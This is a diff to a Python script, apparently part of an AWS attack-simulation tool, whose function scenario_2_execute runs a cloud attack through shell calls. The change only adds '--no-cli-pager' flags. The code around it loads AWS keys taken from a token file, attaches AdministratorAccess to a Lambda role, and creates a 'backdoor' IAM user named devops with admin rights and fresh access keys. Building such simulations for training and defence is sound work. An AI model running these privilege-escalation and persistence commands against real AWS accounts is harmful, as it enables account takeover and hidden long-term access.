@@ -70,7 +70,7 @@ def scenario_2_execute():
     print("-"*30)   
 
     creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
-    subprocess.call(""+creds+" && aws sts get-caller-identity", shell=True)
+    subprocess.call(""+creds+" && aws sts get-caller-identity --no-cli-pager", shell=True)
     
     print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
     subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
@@ -92,9 +92,9 @@ def scenario_2_execute():
     print(colored("Creating a Backdoor User which can be used by the attacker", color="red"))
     loading_animation()
     print("-"*30)
-    subprocess.call(""+creds+" && aws iam create-user --user-name devops", shell=True)
+    subprocess.call(""+creds+" && aws iam create-user --user-name devops --no-cli-pager", shell=True)
     subprocess.call(""+creds+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
-    subprocess.call(""+creds+" && aws iam create-access-key --user-name devops", shell=True)
+    subprocess.call(""+creds+" && aws iam create-access-key --user-name devops --no-cli-pager", shell=True)
 
 
     #Backdoor Role
